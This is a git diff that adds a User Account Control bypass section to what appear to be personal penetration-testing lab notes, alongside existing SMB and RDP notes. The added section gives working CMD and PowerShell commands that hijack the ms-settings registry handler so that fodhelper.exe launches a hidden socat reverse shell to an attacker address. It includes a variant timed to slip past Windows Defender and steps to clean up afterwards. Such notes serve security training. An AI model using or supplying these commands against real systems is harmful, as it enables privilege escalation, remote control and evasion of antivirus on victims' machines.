@@ -13,6 +13,10 @@
     - [Enumeration](#enumeration)
 - [SMB](#smb)
 - [RDP](#rdp)
+- [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
+  - [GUI bypass](#gui-bypass)
+  - [Auto Elevating](#auto-elevating)
+  - [Enviroment Variable](#enviroment-variable)
 - [Bypass Applocker](#bypass-applocker)
 
 # Internal
@@ -362,8 +366,6 @@
 - Owner
   - Get-Acl
 
-
-
 # SMB
 - Server Message BLock
 - share of files on the network
@@ -386,6 +388,86 @@
 
 - Mount local folder:
   - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
+
+# Bypass User Account Control (UAC)
+- New Process are runned as non-privileged-account
+- Tokens
+  - Normal user: 1
+  - Admin: filtered (norma actions) + elevated (admin actions)
+- Bypass ==> goint to elevated to IL (integrity level) high
+- References
+- [UAC git repository](https://github.com/hfiref0x/UACME)
+- [Bypassing UAC](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
+- [Way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
+
+## GUI bypass
+- **msconfig** RUNS with IL high
+    - shell from msconfing = high
+- **azman.msc** ==> help ==> view source = open ==> all files
+
+## Auto Elevating
+- manifest ==> autoElevate (on/off)
+- Change default programm execution in HKEY_Current_USer
+  
+```
+# Define standard application
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+# Link the application to attacker programm
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"
+
+# Make the system used our choue
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+# Add the created command as preference
+reg add %REG_KEY% /d %CMD% /f
+
+# execute fodhelper.exe
+
+### After Windows Defender
+
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"
+
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+# Set command + Query = register delete, windows defender did not act so quickly
+reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% & fodhelper.exe
+
+# Clean Steps
+reg delete HKCU\Software\Classes\ms-settings\ /f
+```
+
+- Variations use other registry keys
+```
+# Powershell
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"
+
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+    
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+# CMD
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"
+
+reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+
+# Clean Steps:
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+```
+
+## Enviroment Variable
 
 
 # Bypass Applocker
